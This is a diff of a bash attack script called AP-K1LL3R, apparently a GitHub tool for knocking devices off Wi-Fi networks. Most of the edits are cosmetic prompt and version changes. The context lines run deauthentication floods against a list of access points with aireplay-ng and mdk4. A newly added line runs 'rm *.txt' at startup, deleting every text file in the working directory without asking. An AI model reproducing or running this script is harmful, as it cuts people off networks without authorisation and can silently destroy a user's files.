@@ -10,6 +10,10 @@ CYAN="\e[36m"
 RESTORE="\e[39"
 BOLD="\e[1m"
 NORMAL="\e[0m"
+function pause {
+	read -p "$*"
+	}
+
 clear
 echo -e $BOLD"${CYAN}"
 figlet AP-K1LL3R
@@ -19,14 +23,11 @@ echo -e "${RED}[!] Important: ${MAGENTA}All errors will saved in ${RED}$path/err
 ${MAGENTA}If you have any unexpected error, report it to my github:
 
 ${YELLOW}https://github.com/ViperZCrew/ap_killer
-
-${RED}Version: v0.1 [BETA VERSION]
-
+${RED}Version: v0.3
 ${MAGENTA}Creator: MrBlackX
-
 ${BLUE}Telegram: t.me/rebl0x3r
 "
-
+rm *.txt
 echo -e "${GREEN}Starting script now..."
 sleep 1
 read -p "Press [Enter] to continue, press after 10 seconds CTRL+C. "
@@ -83,13 +84,13 @@ then
 		echo -e "${BLUE}[*] ${YELLOW}Trying to attack with aireplay...."
 		sleep 1
 		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one $c; done < endresult.txt
-		read -p "[*] Press [Enter] to exit"
+		pause 'Press Enter to exit'
 		rm *.txt	
 	else
 		echo -e "${BLUE}[*] ${YELLOW}Trying to use MDK4 method..."
 		sleep 1
 		mdk4 $c d -w $path/endresult.txt -x 10 -c h
-		read -p "[*] Press [Enter] to exit"
+		pause 'Press Enter to exit'
 		rm *.txt
 	fi
 else
